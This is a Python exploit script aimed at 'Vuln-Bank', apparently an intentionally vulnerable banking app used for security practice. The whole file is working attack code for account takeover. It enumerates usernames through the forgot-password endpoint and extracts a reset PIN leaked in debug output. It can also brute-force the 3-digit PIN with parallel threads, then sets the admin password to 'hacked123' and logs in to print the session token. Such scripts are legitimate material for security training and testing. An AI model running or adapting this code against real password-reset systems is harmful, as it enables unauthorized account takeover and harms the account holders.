#!/usr/bin/env python3
"""
Password Reset Vulnerabilities Exploit for Vuln-Bank

This script demonstrates multiple vulnerabilities in the password reset functionality:
1. Username enumeration
2. 3-digit PIN disclosure
3. No rate limiting for PIN attempts
4. Account takeover via password reset

Usage:
    python3 exploit.py [target_url]

Example:
    python3 exploit.py http://localhost:5000
"""

import requests
import json
import sys
import argparse
import time
import random
from concurrent.futures import ThreadPoolExecutor

def check_username_exists(base_url, username):
    """
    Check if a username exists by exploiting the username enumeration vulnerability
    
    Args:
        base_url: The base URL of the vulnerable application
        username: Username to check
        
    Returns:
        bool: True if username exists, False otherwise
    """
    print(f"[*] Checking if username '{username}' exists...")
    
    forgot_password_url = f"{base_url}/api/v1/forgot-password"
    payload = {"username": username}
    headers = {"Content-Type": "application/json"}
    
    try:
        response = requests.post(forgot_password_url, headers=headers, json=payload)
        data = response.json()
        
        if response.status_code == 200 and data.get('status') == 'success':
            print(f"[+] Username '{username}' exists!")
            return True
        elif response.status_code == 404 and data.get('status') == 'error':
            print(f"[-] Username '{username}' does not exist.")
            return False
        else:
            print(f"[-] Unexpected response: {response.text}")
            return False
    except Exception as e:
        print(f"[-] Error checking username: {str(e)}")
        return False

def get_reset_pin(base_url, username):
    """
    Exploit the PIN disclosure vulnerability to get the reset PIN
    
    Args:
        base_url: The base URL of the vulnerable application
        username: Username to get PIN for
        
    Returns:
        str: Reset PIN if successful, None otherwise
    """
    print(f"[*] Attempting to get reset PIN for '{username}'...")
    
    forgot_password_url = f"{base_url}/api/v1/forgot-password"
    payload = {"username": username}
    headers = {"Content-Type": "application/json"}
    
    try:
        response = requests.post(forgot_password_url, headers=headers, json=payload)
        
        if response.status_code == 200:
            data = response.json()
            debug_info = data.get('debug_info', {})
            pin = debug_info.get('pin')
            
            if pin:
                print(f"[+] Successfully obtained reset PIN: {pin}")
                return pin
            else:
                print(f"[-] PIN not found in response: {data}")
                return None
        else:
            print(f"[-] Failed to get reset PIN. Status code: {response.status_code}")
            print(f"[-] Response: {response.text}")
            return None
    except Exception as e:
        print(f"[-] Error getting reset PIN: {str(e)}")
        return None

def reset_password(base_url, username, reset_pin, new_password):
    """
    Reset a user's password using the obtained PIN
    
    Args:
        base_url: The base URL of the vulnerable application
        username: Username to reset password for
        reset_pin: Reset PIN to use
        new_password: New password to set
        
    Returns:
        bool: True if password reset successful, False otherwise
    """
    print(f"[*] Attempting to reset password for '{username}'...")
    
    reset_password_url = f"{base_url}/api/v1/reset-password"
    payload = {
        "username": username,
        "reset_pin": reset_pin,
        "new_password": new_password
    }
    headers = {"Content-Type": "application/json"}
    
    try:
        response = requests.post(reset_password_url, headers=headers, json=payload)
        
        if response.status_code == 200:
            data = response.json()
            if data.get('status') == 'success':
                print(f"[+] Password reset successful for '{username}'!")
                print(f"[+] New password: {new_password}")
                return True
            else:
                print(f"[-] Password reset failed: {data}")
                return False
        else:
            print(f"[-] Failed to reset password. Status code: {response.status_code}")
            print(f"[-] Response: {response.text}")
            return False
    except Exception as e:
        print(f"[-] Error resetting password: {str(e)}")
        return False

def verify_login(base_url, username, password):
    """
    Verify that the password reset was successful by logging in
    
    Args:
        base_url: The base URL of the vulnerable application
        username: Username to login with
        password: Password to login with
        
    Returns:
        bool: True if login successful, False otherwise
    """
    print(f"[*] Verifying login with new credentials...")
    
    login_url = f"{base_url}/login"
    payload = {"username": username, "password": password}
    headers = {"Content-Type": "application/json"}
    
    try:
        response = requests.post(login_url, headers=headers, json=payload)
        
        if response.status_code == 200:
            data = response.json()
            if data.get('status') == 'success':
                print(f"[+] Login successful! Account takeover complete.")
                print(f"[+] Token: {data.get('token')}")
                return True
            else:
                print(f"[-] Login failed: {data}")
                return False
        else:
            print(f"[-] Login failed. Status code: {response.status_code}")
            print(f"[-] Response: {response.text}")
            return False
    except Exception as e:
        print(f"[-] Error during login: {str(e)}")
        return False

def brute_force_pin(base_url, username, new_password, start=100, end=999):
    """
    Brute force the reset PIN by trying all possible 3-digit combinations
    
    Args:
        base_url: The base URL of the vulnerable application
        username: Username to reset password for
        new_password: New password to set
        start: Starting PIN to try
        end: Ending PIN to try
        
    Returns:
        bool: True if successful, False otherwise
    """
    print(f"[*] Starting brute force attack on reset PIN for '{username}'...")
    print(f"[*] Testing PINs from {start} to {end}...")
    
    # Request a reset PIN first to ensure one is set
    requests.post(
        f"{base_url}/api/v1/forgot-password",
        headers={"Content-Type": "application/json"},
        json={"username": username}
    )
    
    reset_password_url = f"{base_url}/api/v1/reset-password"
    headers = {"Content-Type": "application/json"}
    
    # Try each possible PIN
    for pin in range(start, end + 1):
        pin_str = str(pin).zfill(3)  # Ensure 3 digits with leading zeros
        
        payload = {
            "username": username,
            "reset_pin": pin_str,
            "new_password": new_password
        }
        
        try:
            print(f"[*] Trying PIN: {pin_str} ({pin - start + 1}/{end - start + 1})")
            response = requests.post(reset_password_url, headers=headers, json=payload)
            
            if response.status_code == 200:
                data = response.json()
                if data.get('status') == 'success':
                    print(f"[+] PIN found: {pin_str}")
                    print(f"[+] Password reset successful for '{username}'!")
                    print(f"[+] New password: {new_password}")
                    return True
            
            # Add a small delay to avoid overwhelming the server
            time.sleep(0.1)
            
        except Exception as e:
            print(f"[-] Error during brute force: {str(e)}")
    
    print(f"[-] Brute force attack failed. Could not find valid PIN.")
    return False

def parallel_brute_force_pin(base_url, username, new_password, workers=10):
    """
    Brute force the reset PIN using multiple threads for faster execution
    
    Args:
        base_url: The base URL of the vulnerable application
        username: Username to reset password for
        new_password: New password to set
        workers: Number of worker threads to use
        
    Returns:
        bool: True if successful, False otherwise
    """
    print(f"[*] Starting parallel brute force attack with {workers} workers...")
    
    # Request a reset PIN first to ensure one is set
    requests.post(
        f"{base_url}/api/v1/forgot-password",
        headers={"Content-Type": "application/json"},
        json={"username": username}
    )
    
    # Generate all possible 3-digit PINs
    all_pins = [str(i).zfill(3) for i in range(1000)]
    
    # Shuffle the PINs to distribute the load more evenly
    random.shuffle(all_pins)
    
    # Flag to signal when a valid PIN is found
    found = {"pin": None, "success": False}
    
    def try_pin(pin):
        if found["success"]:
            return
            
        reset_password_url = f"{base_url}/api/v1/reset-password"
        headers = {"Content-Type": "application/json"}
        payload = {
            "username": username,
            "reset_pin": pin,
            "new_password": new_password
        }
        
        try:
            response = requests.post(reset_password_url, headers=headers, json=payload)
            
            if response.status_code == 200:
                data = response.json()
                if data.get('status') == 'success':
                    found["pin"] = pin
                    found["success"] = True
                    print(f"[+] PIN found: {pin}")
                    print(f"[+] Password reset successful for '{username}'!")
                    print(f"[+] New password: {new_password}")
                    return True
        except Exception:
            pass
        
        return False
    
    # Use ThreadPoolExecutor to try PINs in parallel
    with ThreadPoolExecutor(max_workers=workers) as executor:
        executor.map(try_pin, all_pins)
    
    if found["success"]:
        return True
    else:
        print(f"[-] Parallel brute force attack failed. Could not find valid PIN.")
        return False

def main():
    parser = argparse.ArgumentParser(description="Exploit password reset vulnerabilities in Vuln-Bank")
    parser.add_argument("url", nargs="?", default="http://localhost:5000", 
                        help="Base URL of the vulnerable application (default: http://localhost:5000)")
    parser.add_argument("--username", default="admin", help="Username to target")
    parser.add_argument("--new-password", default="hacked123", help="New password to set")
    parser.add_argument("--brute-force", action="store_true", help="Use brute force to find the PIN")
    parser.add_argument("--parallel", action="store_true", help="Use parallel brute force")
    parser.add_argument("--workers", type=int, default=10, help="Number of worker threads for parallel brute force")
    args = parser.parse_args()
    
    print("=== Vuln-Bank Password Reset Vulnerabilities Exploit ===")
    print(f"[*] Target: {args.url}")
    print(f"[*] Target username: {args.username}")
    
    # Check if the username exists
    if not check_username_exists(args.url, args.username):
        print(f"[-] Username '{args.username}' does not exist. Exiting.")
        sys.exit(1)
    
    if args.brute_force:
        if args.parallel:
            success = parallel_brute_force_pin(args.url, args.username, args.new_password, args.workers)
        else:
            success = brute_force_pin(args.url, args.username, args.new_password)
    else:
        # Get the reset PIN
        reset_pin = get_reset_pin(args.url, args.username)
        if not reset_pin:
            print("[-] Failed to get reset PIN. Exiting.")
            sys.exit(1)
        
        # Reset the password
        success = reset_password(args.url, args.username, reset_pin, args.new_password)
    
    if success:
        # Verify the new credentials
        verify_login(args.url, args.username, args.new_password)
        print("\n[+] Exploitation complete. Account takeover successful!")
    else:
        print("\n[-] Exploitation failed.")

if __name__ == "__main__":
    main()
